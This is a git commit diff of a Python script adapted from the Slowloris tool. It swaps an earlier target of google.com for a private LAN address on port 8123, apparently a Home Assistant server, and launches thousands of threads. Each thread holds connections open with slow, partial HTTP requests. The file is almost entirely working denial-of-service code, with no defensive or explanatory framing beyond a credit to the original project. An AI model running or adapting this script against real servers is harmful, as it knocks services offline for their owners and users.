fe7f880f89ea697dd4b0afe3e02c47bf9a701e3f
Long Nguyen <43763576+EmbodyTheLogos@users.noreply.github.com>
2023-07-14 15:46:06 -0400

    Update custom_slowloris.py

--- custom_slowloris.py
+++ custom_slowloris.py
@@ -1,27 +1,51 @@
+'''
+	Author: Long Nguyen
+	Decription: Modification of Slowloris.py from https://github.com/gkbrk/slowloris
+'''
+
 import socket
 from threading import Thread
 from multiprocessing import Process
 import time
-HOST = "google.com"
-PORT = 443
+import random
+HOST = "192.168.1.137"
+PORT = 8123
+
+
+def send_header(s, name, value):
+    s.send(f"{name}: {value}".encode())
+
+def send_line(s, line):
+    line = f"{line}\r\n"
+    s.send(line.encode("utf-8"))
 
 def connect_to_ha():
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((HOST, PORT))
-	print("connected to server")
 	while True:
-		s.send("Hello".encode())
-		time.sleep(1)
-	
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((HOST, PORT))
+			while True:
+				try:
+					send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+					send_header(s, "X-a", random.randint(1, 5000))
+					#print("sent to server")
+					time.sleep(1)
+				except Exception or TimeoutError:
+					print("exception occured")
+					s.close()
+					pass
+		except TimeoutError:
+			s.close()
+			pass
+		
 	
 def slowloris():
-	for i in range(100):
-		Thread(target=connect_to_ha).start()
+	for i in range(500):
+		Thread(target = connect_to_ha).start()
 		
 def main():
-	for i in range(20):
+	for i in range(10):
 		Process(target = slowloris).start()
-		
 		
 if __name__ == "__main__":
 	main()
